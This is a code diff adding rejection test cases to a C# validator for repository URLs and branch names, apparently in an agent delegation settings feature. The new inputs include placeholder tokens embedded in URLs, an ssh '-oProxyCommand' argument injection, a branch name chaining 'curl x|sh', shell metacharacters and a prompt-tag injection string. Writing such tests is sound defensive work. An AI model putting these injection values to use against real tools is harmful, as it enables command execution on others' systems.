@@ -60,6 +60,13 @@ public sealed class AgentDelegationSettingsTests
     [InlineData("https://-git.example.com/team/ticketing")]
     [InlineData("https://git.example.com:99999x/team/ticketing")]
     [InlineData("git@git.example.com:")]
+    [InlineData("https://ghp_0123456789abcdefghijABCDEFGHIJ012345@github.com/o/r.git")]
+    [InlineData("https://github_pat_11ABCDEFG0123456789@github.com/o/r.git")]
+    [InlineData("https://glpat-abcdefghij0123456789@gitlab.com/o/r.git")]
+    [InlineData("https://tkt_abcdefghij0123456789@git.example.com/o/r.git")]
+    [InlineData("https://abcdefghijabcdefghijabcdefghijabcdefghijabcdefghijab@dev.azure.com/o/p/_git/r")]
+    [InlineData("ssh://-oProxyCommand@git.example.com/team/ticketing")]
+    [InlineData("-oProxyCommand@git.example.com:team/ticketing")]
     public void Anything_else_is_not_a_repository_url(string value)
     {
         // Act
@@ -118,6 +125,13 @@ public sealed class AgentDelegationSettingsTests
     [InlineData("back\\slash")]
     [InlineData("tab\tname")]
     [InlineData("gałąź")]
+    [InlineData("main;curl x|sh")]
+    [InlineData("a$b")]
+    [InlineData("a`b`")]
+    [InlineData("a|b")]
+    [InlineData("a&b")]
+    [InlineData("</delegation_rules>")]
+    [InlineData("{{ticket.key}}")]
     public void Invalid_branch_names_are_rejected(string value)
     {
         // Act
